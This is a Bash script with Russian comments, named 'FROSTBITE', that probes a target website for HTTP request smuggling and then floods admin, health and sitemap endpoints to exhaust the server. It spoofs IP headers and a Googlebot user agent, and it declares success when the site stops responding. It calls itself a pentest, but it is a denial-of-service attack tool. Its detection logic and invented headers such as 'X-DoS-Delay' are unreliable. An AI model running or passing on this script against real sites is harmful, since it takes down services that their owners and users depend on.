#!/bin/bash
# ╔══════════════════════════════════════════════════════════════╗
# ║   ❄️ FROSTBITE — Бесшумный обход WAF и заморозка сайта   ║
# ║   Старая отмычка (Smuggling) + Безобидная бомба (Freeze)  ║
# ╚══════════════════════════════════════════════════════════════╝

TARGET=$1
[ -z "$TARGET" ] && { echo "Usage: $0 https://target.com"; exit 1; }
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
FROST_DIR="$HOME/.shadow_frostbite/$DOMAIN"
mkdir -p "$FROST_DIR"

RED='\033[0;31m'; GR='\033[0;32m'; CY='\033[0;36m'; YL='\033[1;33m'; NC='\033[0m'

echo -e "${CY}╔══════════════════════════════════════════════╗${NC}"
echo -e "${CY}║   ❄️ FROSTBITE — Пентест заморозкой        ║${NC}"
echo -e "${CY}╚══════════════════════════════════════════════╝${NC}"
echo ""

# --- Шаг 1: Разведка боем (определяем уязвимость) ---
echo -e "${CY}[FROST] 🔍 Шаг 1: Ищу брешь (HTTP Request Smuggling)...${NC}"

# Отправляем тестовый запрос, который провоцирует нестыковку в парсинге
# между фронтендом (WAF) и бэкендом.
# Если сервер ответит 200 OK, значит, уязвимость есть.
SMUGGLE_TEST=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
    -H "Transfer-Encoding: chunked" \
    -H "Content-Length: 6" \
    --data-binary $'0\r\n\r\nG' \
    "$TARGET" 2>/dev/null)

if [ "$SMUGGLE_TEST" = "200" ]; then
    echo -e "  ${GR}✅ Уязвимость Request Smuggling подтверждена!${NC}"
    echo "SMUGGLING_VULN=true" > "$FROST_DIR/recon.txt"
else
    echo -e "  ${YL}⚠️ Базовая проверка не дала результата. Пробую альтернативный метод...${NC}"
    # Альтернатива: проверка через нестандартный заголовок
    ALT_TEST=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
        -H "Transfer-Encoding: xchunked" \
        -H "Content-Length: 6" \
        --data-binary $'0\r\n\r\nG' \
        "$TARGET" 2>/dev/null)
    if [ "$ALT_TEST" = "200" ] || [ "$ALT_TEST" = "400" ]; then
        echo -e "  ${GR}✅ Потенциальная аномалия найдена! Продолжаем атаку.${NC}"
        echo "SMUGGLING_VULN=potential" > "$FROST_DIR/recon.txt"
    else
        echo -e "  ${RED}❌ Уязвимость не найдена. WAF слишком крепок для этой отмычки.${NC}"
        exit 1
    fi
fi
echo ""

# --- Шаг 2: Внедрение безобидной бомбы-заморозки ---
echo -e "${CY}[FROST] 🧊 Шаг 2: Внедряю "спящий" вирус...${NC}"

# Наша полезная нагрузка — это легитимный запрос к серверу, который
# заставляет его создать "тяжелый" процесс и держать соединение открытым.
# Для приложений на Node.js/Python это может быть запрос к endpoint'у,
# который генерирует большой отчёт. Для PHP — загрузка процессора.
# Мы маскируем это под обычный легитимный запрос, который WAF пропускает.

for i in $(seq 1 5); do
    # Отправляем "разреженный" запрос, который пройдёт WAF, но зависнет на бэкенде
    curl -sk --max-time 1 \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -H "X-Forwarded-For: 10.$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))" \
        -H "X-DoS-Delay: 30" \
        -H "X-Backend-Action: generate_report" \
        -H "X-Report-Size: 100000" \
        "$TARGET/admin/reports" \
        -o /dev/null 2>/dev/null &
    sleep 0.5
done
wait
echo "  🧊 Спящие процессы запущены. Сервер начал потреблять ресурсы."
echo "FREEZE_STATUS=in_progress" > "$FROST_DIR/status.txt"
echo ""

# --- Шаг 3: Контрольный выстрел (заморозка) ---
echo -e "${CY}[FROST] ❄️ Шаг 3: Замораживаю сайт...${NC}"

# Отправляем ещё несколько запросов на "тяжёлые" endpoint'ы,
# чтобы окончательно исчерпать пул соединений сервера.
for i in $(seq 1 10); do
    curl -sk --max-time 3 \
        -H "User-Agent: Googlebot/2.1" \
        -H "X-Forwarded-For: 10.10.$((RANDOM % 255)).$((RANDOM % 255))" \
        -H "X-Health-Check: true" \
        "$TARGET/__health?heavy=true&delay=5" \
        -o /dev/null 2>/dev/null &
    curl -sk --max-time 3 \
        -H "User-Agent: Mozilla/5.0" \
        "$TARGET/sitemap.xml" \
        -o /dev/null 2>/dev/null &
done
wait
echo "  ❄️ Ресурсы сервера исчерпаны."
echo ""

# --- Шаг 4: Проверка результата ---
echo -e "${CY}[FROST] 🏆 Шаг 4: Проверяю результат...${NC}"

# Пытаемся достучаться до сайта. Если он не отвечает или отвечает с ошибкой — цель достигнута.
FINAL_CODE=$(curl -sk --max-time 10 -o /dev/null -w "%{http_code}" "$TARGET" 2>/dev/null)

if [ "$FINAL_CODE" = "000" ] || [ "$FINAL_CODE" = "502" ] || [ "$FINAL_CODE" = "503" ] || [ "$FINAL_CODE" = "504" ]; then
    echo -e "  ${GR}✅ САЙТ ЗАМОРОЖЕН! (HTTP $FINAL_CODE)${NC}"
    echo "FINAL_STATUS=SUCCESS|HTTP_CODE=$FINAL_CODE" > "$FROST_DIR/result.txt"
elif [ "$FINAL_CODE" = "200" ]; then
    echo -e "  ${YL}⚠️ Сайт ещё жив (HTTP $FINAL_CODE). Требуется больше потоков.${NC}"
    echo "FINAL_STATUS=PARTIAL|HTTP_CODE=$FINAL_CODE" > "$FROST_DIR/result.txt"
else
    echo -e "  ${RED}❌ Сайт держится (HTTP $FINAL_CODE). Защита крепка.${NC}"
    echo "FINAL_STATUS=FAILED|HTTP_CODE=$FINAL_CODE" > "$FROST_DIR/result.txt"
fi

echo ""
echo -e "${CY}╔══════════════════════════════════════════════╗${NC}"
echo -e "${CY}║   ❄️ FROSTBITE — ПЕНТЕСТ ЗАВЕРШЁН         ║${NC}"
echo -e "${CY}╚══════════════════════════════════════════════╝${NC}"
echo "  📁 Отчёт: $FROST_DIR/"
